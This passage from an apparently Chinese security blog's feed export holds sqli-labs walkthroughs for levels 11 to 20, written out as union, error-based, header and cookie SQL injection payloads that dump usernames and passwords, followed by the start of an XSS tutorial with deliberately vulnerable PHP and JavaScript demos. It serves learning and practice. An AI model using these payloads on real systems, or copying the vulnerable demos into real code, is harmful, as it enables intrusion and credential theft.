data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164906282-958162447.png\" alt=\"img\"></p>\n<p>这里我们就可以知道这个列数为二</p>\n<h2 id=\"判断回显位置\"><a href=\"#判断回显位置\" class=\"headerlink\" title=\"判断回显位置#\"></a>判断回显位置<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI5Njk4MzU5OTE=\">#</span></h2><p>‘ union select 1,2#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164913474-41172665.png\" alt=\"img\"></p>\n<h2 id=\"查询数据库名，和当前用户名\"><a href=\"#查询数据库名，和当前用户名\" class=\"headerlink\" title=\"查询数据库名，和当前用户名#\"></a>查询数据库名，和当前用户名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM5NTc2ODMzOTU=\">#</span></h2><p>‘ union select database(),user()#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164921645-256865113.png\" alt=\"img\"></p>\n<h2 id=\"爆表\"><a href=\"#爆表\" class=\"headerlink\" title=\"爆表#\"></a>爆表<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyMTM5MDEyNw==\">#</span></h2><p>‘ union select database(),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164929661-1478734525.png\" alt=\"img\"></p>\n<h2 id=\"看users这个表上面的字段名\"><a href=\"#看users这个表上面的字段名\" class=\"headerlink\" title=\"看users这个表上面的字段名#\"></a>看users这个表上面的字段名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2OTc1NzUxMjg=\">#</span></h2><p>‘ union select (select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164936963-1801874226.png\" alt=\"img\"></p>\n<h2 id=\"查询用户名和密码\"><a href=\"#查询用户名和密码\" class=\"headerlink\" title=\"查询用户名和密码#\"></a>查询用户名和密码<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzIwNjcwNjI4NjA=\">#</span></h2><p>‘ union select (select group_concat(username) from security.users),(select group_concat(password) from security.users)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164950554-1026166699.png\" alt=\"img\"></p>\n<h1 id=\"第十二关将’改为“）即可\"><a href=\"#第十二关将’改为“）即可\" class=\"headerlink\" title=\"第十二关将’改为“）即可\"></a>第十二关将’改为“）即可</h1><h1 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h1><p>这个题打开后</p>\n<p>先用弱口令登录发现登录上但是没有回显，考虑使用报错注入</p>\n<h2 id=\"首先了解一波报错的句型\"><a href=\"#首先了解一波报错的句型\" class=\"headerlink\" title=\"首先了解一波报错的句型#\"></a>首先了解一波报错的句型<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE1Mzk5ODkyOTk=\">#</span></h2><h3 id=\"floor报错\"><a href=\"#floor报错\" class=\"headerlink\" title=\"floor报错#\"></a>floor报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzMxNDM2NzQ3OTE=\">#</span></h3><p><em>union select 1,count(</em>),concat((注入语句)，floor(rand()*2))as a from information_schema.columns group by a</p>\n<p>祥见5-6关</p>\n<h3 id=\"updatexml报错\"><a href=\"#updatexml报错\" class=\"headerlink\" title=\"updatexml报错#\"></a>updatexml报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI0MzY2MDU2NDE=\">#</span></h3><p>and updatexml(1,concat(注入语句),1)</p>\n<h3 id=\"extractvalue报错\"><a href=\"#extractvalue报错\" class=\"headerlink\" title=\"extractvalue报错#\"></a>extractvalue报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI4ODExMTY5ODU=\">#</span></h3><p>and (extractvalue(1,concat(注入语句)))</p>\n<h2 id=\"先用floor报错\"><a href=\"#先用floor报错\" class=\"headerlink\" title=\"先用floor报错#\"></a>先用floor报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM2MzQwOTYxNzA=\">#</span></h2><p>‘) union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170034190-29499768.png\" alt=\"img\"></p>\n<p>‘) union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170056710-97820973.png\" alt=\"img\"></p>\n<h2 id=\"用updatexml报错\"><a href=\"#用updatexml报错\" class=\"headerlink\" title=\"用updatexml报错#\"></a>用updatexml报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI0ODU1MDIxNQ==\">#</span></h2><p>‘) and updatexml(1,concat(0x7e,database(),0x7e),1)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170105687-1661554095.png\" alt=\"img\"></p>\n<p>‘) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170111524-675798314.png\" alt=\"img\"></p>\n<h2 id=\"用extractvalue报错\"><a href=\"#用extractvalue报错\" class=\"headerlink\" title=\"用extractvalue报错#\"></a>用extractvalue报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM0MTE4NjcyMDA=\">#</span></h2><p>‘) and extractvalue(0x7e,(select database()),0x7e))#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170140846-916061629.png\" alt=\"img\"></p>\n<p>第十四题闭合为”其余参考十三题</p>\n<h1 id=\"第十七关\"><a href=\"#第十七关\" class=\"headerlink\" title=\"第十七关\"></a>第十七关</h1><h2 id=\"打开发现如图\"><a href=\"#打开发现如图\" class=\"headerlink\" title=\"打开发现如图#\"></a>打开发现如图<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQ2NDA5MDAxMA==\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213756395-518273297.png\" alt=\"img\"></p>\n<p>PASSWORD RESET他这里显示重置密码</p>\n<p>这里对账号框尝试了很多闭合发现都登录失败于是我投考了度娘，打开了PHP文件</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213752293-758194299.png\" alt=\"img\"></p>\n<p>这里我们可以看到，他先审核了账号，如果账号存在则对密码进行操作可知，这个注入点在密码框里且使用单引号闭合</p>\n<h2 id=\"下面开始爆库名\"><a href=\"#下面开始爆库名\" class=\"headerlink\" title=\"下面开始爆库名#\"></a>下面开始爆库名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzMzNzYyODAxMTA=\">#</span></h2><p>User Name上面输入admin</p>\n<p>New Password上面用1‘ and updatexml(1,concat(0x5e,database(),0x5e),1)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213746117-1356775353.png\" alt=\"img\"></p>\n<p>爆名成功，其余步骤见第5-6关</p>\n<h1 id=\"首先了解下updatexml-函数\"><a href=\"#首先了解下updatexml-函数\" class=\"headerlink\" title=\"首先了解下updatexml()函数\"></a>首先了解下updatexml()函数</h1><p>PDATEXML (XML_document, XPath_string, new_value);</p>\n<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>\n<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>\n<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>\n<p>作用：改变文档中符合条件的节点的值</p>\n<p>改变XML_document中符合XPATH_string的值</p>\n<p>而我们的注入语句为：</p>\n<p>updatexml(1,concat(0x7e,(&#96;&#96;SELECT<code> </code>@@version),0x7e),1)</p>\n<p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p>\n<p>ERROR 1105 (HY000): XPATH syntax error: &#96;&#96;’:root@localhost’</p>\n<h1 id=\"开始做第十八关\"><a href=\"#开始做第十八关\" class=\"headerlink\" title=\"开始做第十八关\"></a>开始做第十八关</h1><p>打开第十八关发现网页显示了我们的IP</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213738557-1229555793.png\" alt=\"img\"></p>\n<p>先登录一下试试</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213734373-1416993883.png\" alt=\"img\"></p>\n<p>登录后，网页显示了我们的User Agent，可以猜测网页将我们的信息插入到数据库中，再返回到页面上。只有与数据库有交互，就有可能存在注入点，因此我们尝试修改User Agent字段。这里使用了bp抓包工具，先抓取一个登录成功的包</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213725052-1422925589.png\" alt=\"img\"></p>\n<p>再发送到repeater里，方便修改数据测试</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213717550-1282837680.png\" alt=\"img\"></p>\n<p>先发送一个正常的数据包</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213713647-604909032.png\" alt=\"img\"></p>\n<p>可以看到返回正常我们将UA改成一个单引号重新发送</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213707926-1684541585.png\" alt=\"img\"></p>\n<p>这里出现了报错，很明显存在注入，这里是insert插入语句，所以我们用报错注入将UA改成</p>\n<p>1’ and updatexml(1,concat(0x7e,database(),0x7e),1) and ‘1</p>\n<h1 id=\"爆出数据库\"><a href=\"#爆出数据库\" class=\"headerlink\" title=\"爆出数据库\"></a>爆出数据库</h1><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213653218-663027854.png\" alt=\"img\"></p>\n<h1 id=\"接下来爆表\"><a href=\"#接下来爆表\" class=\"headerlink\" title=\"接下来爆表\"></a>接下来爆表</h1><p>1’ and updatexml(1,concat(0x5e,(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1)),0x5e),1) and ‘1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213647696-1014400514.png\" alt=\"img\"></p>\n<h1 id=\"接下来爆字段名\"><a href=\"#接下来爆字段名\" class=\"headerlink\" title=\"接下来爆字段名\"></a>接下来爆字段名</h1><p>1’ and updatexml(1,concat(0x5e,(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),1)),0x5e),1) and ‘1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213641430-437545893.png\" alt=\"img\"></p>\n<h1 id=\"接下来爆字段上的信息\"><a href=\"#接下来爆字段上的信息\" class=\"headerlink\" title=\"接下来爆字段上的信息\"></a>接下来爆字段上的信息</h1><p>1’ and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) and ‘1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213632981-778164895.png\" alt=\"img\"></p>\n<p>第十九关是基于Referer的注入</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213619446-664759808.png\" alt=\"img\"></p>\n<p>其余步骤详见第十八关</p>\n<h1 id=\"第二十关\"><a href=\"#第二十关\" class=\"headerlink\" title=\"第二十关\"></a>第二十关</h1><h2 id=\"什么是cookie注入？\"><a href=\"#什么是cookie注入？\" class=\"headerlink\" title=\"什么是cookie注入？#\"></a>什么是cookie注入？<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzYxNzg2NTgzMQ==\">#</span></h2><p>cookie注入的原理是：就是修改cookie的值进行注入（cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie）</p>\n<h2 id=\"2-怎样cookie注入？\"><a href=\"#2-怎样cookie注入？\" class=\"headerlink\" title=\"2.怎样cookie注入？#\"></a>2.怎样cookie注入？<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI4MjYzNzQ0NzA=\">#</span></h2><p>cookie注入跟普通sql注入过程一样：</p>\n<p>1.判断是不是注入点</p>\n<p>2.得到字段总数</p>\n<p>3.查选表名</p>\n<p>4.查选列名</p>\n<p>5.脱库</p>\n<p>发现如下，我们先用弱密码登录<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213607270-1849134554.png\" alt=\"img\"></p>\n<p>登录成功发现</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213558449-1134427262.png\" alt=\"img\"></p>\n<p>这里我们代码审计查看后台源码<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213534291-1431436633.png\" alt=\"img\"></p>\n<p>可以看到注入点在cookie且为单引号闭合，又是select * from这里要用二分法猜字段。</p>\n<p>我们抓包后将Cookie改成1’<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213527669-960376843.png\" alt=\"img\"></p>\n<h2 id=\"报错，这里用二分法查字段\"><a href=\"#报错，这里用二分法查字段\" class=\"headerlink\" title=\"报错，这里用二分法查字段#\"></a>报错，这里用二分法查字段<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyNjM1Mzc4NA==\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213519073-2114535812.png\" alt=\"img\"></p>\n<p>1’ order by 4#时报错</p>\n<p>联合查询1’ union select 1,2,3#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213509975-1599606389.png\" alt=\"img\"></p>\n<p>23位回显</p>\n<h2 id=\"爆数据库名和版本号\"><a href=\"#爆数据库名和版本号\" class=\"headerlink\" title=\"爆数据库名和版本号#\"></a>爆数据库名和版本号<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQwNDA4NjQ0NDk=\">#</span></h2><p>1’ union select 1,database(),version()#<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213503579-1665802534.png\" alt=\"img\"></p>\n<h2 id=\"爆表名\"><a href=\"#爆表名\" class=\"headerlink\" title=\"爆表名#\"></a>爆表名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM1ODA1ODUxNA==\">#</span></h2><p>1’ union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)#<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213452986-238568021.png\" alt=\"img\"></p>\n<h2 id=\"爆字段名\"><a href=\"#爆字段名\" class=\"headerlink\" title=\"爆字段名#\"></a>爆字段名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyNDIzMjYxNTQ=\">#</span></h2><p>1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213433398-945139268.png\" alt=\"img\"></p>\n<h2 id=\"爆字段上的信息\"><a href=\"#爆字段上的信息\" class=\"headerlink\" title=\"爆字段上的信息#\"></a>爆字段上的信息<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM4NzMxMTU3OTE=\">#</span></h2><p>1’ union select 1,(select group_concat(username) from users),(select group_concat(password) from users)#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213423003-1053380243.png\" alt=\"img\"></p>\n<p>完成注入</p>\n<p> 基础篇到此结束</p>\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "url": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "title": "XSS跨站脚本攻击",
            "date_published": "2022-10-28T16:00:00.000Z",
            "content_html": "<h1 id=\"XSS跨站脚本攻击\"><a href=\"#XSS跨站脚本攻击\" class=\"headerlink\" title=\"XSS跨站脚本攻击\"></a>XSS跨站脚本攻击</h1><p>xss也叫css为了和层叠样式表（Cascading Style Sheets，CSS）的缩写区分。因此将跨站脚本攻击缩写为XSS。</p>\n<p>xss攻击是指攻击者在网页中嵌入客户端脚本，通常是js代码，在用户访问时，恶意代码执行</p>\n<h1 id=\"原理刨析\"><a href=\"#原理刨析\" class=\"headerlink\" title=\"原理刨析\"></a>原理刨析</h1><p>攻击者可以通过一些方式向网页中写入恶意代码，导致用户在加载网页时浏览器渲染执行了恶意脚本</p>\n<p>上面提到xss攻击是嵌入客户端脚本，大多数是js，少部分使用AS和VBS，那么也就是说在能够利用漏洞的情况下，js能做到什么效果，xss的利用就能做到什么效果</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">javaScript加载外部的代码文件可以是任意文件扩展名，即使是图片扩展名只要包含js代码就能执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"xss分类\"><a href=\"#xss分类\" class=\"headerlink\" title=\"xss分类\"></a>xss分类</h1><p>主要被分为三种，反射型，储存型和DOM型，接下来详细说明</p>\n<h3 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h3><p>首先，先盗个图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025215134992.png\" alt=\"image-20221025215134992\"></p>\n<p>反射型xss也被称为非持久型的xss，反射型xss是当先最常见的一种xss漏洞。攻击者将带有xss恶意脚本的连接发给用户诱导其点击，用户向服务器请求了一个带有xss脚本的url请求，服务器返回给浏览器，浏览器解析xss脚本区访问了恶意服务器造成漏洞</p>\n<p>demo</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>服务端对用户的name没有进行过滤，服务器解析后通过echo插入到HTML中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221057624.png\" alt=\"image-20221025221057624\"></p>\n<p>这里插入js，便可执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221207814.png\" alt=\"image-20221025221207814\"></p>\n<h3 id=\"存储型\"><a href=\"#存储型\" class=\"headerlink\" title=\"存储型\"></a>存储型</h3><p>还是先盗个图（我发四，本篇最后一张）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025220126444.png\" alt=\"image-20221025220126444\"></p>\n<p>刚刚说到反射型也叫非持久性，那么存储型就是持久型xss，与xss的区别就是提交的xss代码是否会被存储在服务端，下次访问到这个页面时还会执行恶意脚本。（存储型xss不在是攻击者诱导受害者点击连接，而是将xss脚本留在目标服务器上，当受害者访问了存有xss脚本的页面时就受到了攻击，允许用户进行数据存储的地方都有可能存在xss漏洞，这种xss攻击比反射型危害更大。） </p>\n<p>demo</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\necho &quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>保存到文件中，每次访问时都会执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221521051.png\" alt=\"image-20221025221521051\"></p>\n<h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><p>个人理解其实也算是反射型，但是DOM型的xss不需要与服务端交互，仅仅发生在客户端处理数据的阶段，DOM全称Document Object Model（文档对象模型），对于浏览器来说DOM就是一份xml，JavaScript重构HTML页面的过程中使用DOM提供结构化表示，DOM规定HTML中每个成分都是一个结点</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">DOM规定：\n整个文档是一个文档结点\n每一个HTML标签是一个元素结点\n包含在HTML元素中的文本是文本结点\n每个HTML属性是一个属性结点\n结点与结点之间都有等级关系<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>HTML DOM树</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025224329456.png\" alt=\"image-20221025224329456\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">可能触发DOM型XSS的属性\ndocument.referer属性\n\nwindow.name属性\n\nlocation属性\n\ninnerHTML属性\n\ndocumen.write属性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"DOM型xss利用原理\"><a href=\"#DOM型xss利用原理\" class=\"headerlink\" title=\"DOM型xss利用原理\"></a>DOM型xss利用原理</h4><p>利用前提是js可以访问DOM文本对象模型，如果客户端代码中有xss脚本诱导用户点击可以使得用户访问自己构造的url，达到和反射型类似的效果，因其不与服务器进行交互，可以用来绕过waf</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">var</span> tem <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取当前页面的URL</span>\n    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取content=后面的内容</span>\n    <span class=\"token keyword\">var</span> par <span class=\"token operator\">=</span> tem<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取参数</span>\n    document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>par<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//decodeURI()解码//输出参数</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026213845778.png\" alt=\"image-20221026213845778\"></p>\n<h1 id=\"Xss的检测\"><a href=\"#Xss的检测\" class=\"headerlink\" title=\"Xss的检测\"></a>Xss的检测</h1><p>检测xss主要有两种方法，一种是手工检测，一种是通过自动化工具检测，个人感觉两种方法没有先后各有利弊吧。手工检测的精度更高，但是当一个web应用程序过于庞大的情况，手工检测是非常困难的，用工具自动化检测精度相对要低上不少</p>\n<h3 id=\"手工检测xss\"><a href=\"#手工检测xss\" class=\"headerlink\" title=\"手工检测xss\"></a>手工检测xss</h3><p>手工检测时，主要考虑有输出和能够存储的地方进行测试，可以尝试使用特征明显的字符来进行测试</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt; &gt; &quot;  &#39; ( )等字符<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>同时携带上如AAAAAAA字便于查找插入到HTML中的位置</p>\n<h3 id=\"Xss工具\"><a href=\"#Xss工具\" class=\"headerlink\" title=\"Xss工具\"></a>Xss工具</h3><p>这里工具很多不再一一赘述，推荐去GitHub上寻找开源的工具</p>\n<h1 id=\"Xss的利用种类\"><a href=\"#Xss的利用种类\" class=\"headerlink\" title=\"Xss的利用种类\"></a>Xss的利用种类</h1><p>在一些情况下xss漏洞的危害不亚于sql注入，常见的利用方法：</p>\n<ul>\n<li>盗取用户cookie</li>\n<li>修改网页内容</li>\n<li>网站挂马</li>\n<li>利用网站重定向</li>\n<li>xss蠕虫</li>\n</ul>\n<h3 id=\"xss会话劫持\"><a href=\"#xss会话劫持\" class=\"headerlink\" title=\"xss会话劫持\"></a>xss会话劫持</h3><p>这里多数是指劫持cookie或session达到目的</p>\n<h4 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h4><p>cookie是一种能够将少量文本存储到客户端的磁盘、内存上面或者从客户端的内存、磁盘上面读取的一种技术</p>\n<p>一位我尊敬的师长说过，每一种技术或者协议的产生都是由需求驱动的，cookie的产生主要是为了解决http协议的无状态，web服务器需要额外的数据用于维持会话，cookie正是一一段随http请求的响应的额外数据，他的主要作用是标识用户维持会话</p>\n<p>cookie主要分为持久cookie和非持久cookie，这两种分类的主要区别就是持久cookie是存储到客户端的磁盘中的只有到了过期时间或者手动删除才会失效，非辞旧cookie是存储到客户端的内存上的，浏览器关闭后就会消失</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cookie一般会经过加密，只有服务器的处理程序才知道cookie的含义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>部分开发者将cookie作为用户的标识，那么我们就可以通过劫持cookie来登录账号，而部分开发者不会将cookie当作用户的标识，而是储存一些临时信息，那么我们拿到cookie也是没用的</p>\n<h4 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h4><p>除去cookie外维持会话的另一种形式就是session，session在网络应用中被称为会话是一种服务端的机制，我们打开网站到关闭浏览器这段时间被称为会话，如果我们在服务端与客户端的会话没结束时就拿到session就能做到劫持会话的效果 </p>\n<h1 id=\"xss漏洞攻与防\"><a href=\"#xss漏洞攻与防\" class=\"headerlink\" title=\"xss漏洞攻与防\"></a>xss漏洞攻与防</h1><p>xss跨站脚本漏洞的根本原因还是开发者对用户的输入输出没有进行严格的过滤，而导致的客户端脚本被浏览器正常执行导致，这也就意味着如果我们能够将敏感字符过滤就能够修补xss漏洞</p>\n<h3 id=\"特定的标签过滤\"><a href=\"#特定的标签过滤\" class=\"headerlink\" title=\"特定的标签过滤\"></a>特定的标签过滤</h3><p>部分开发者认为将危险的标签过滤掉就不会执行js脚本，但是实际上任何一种标签无论是否合法都能够正常执行js脚本</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code 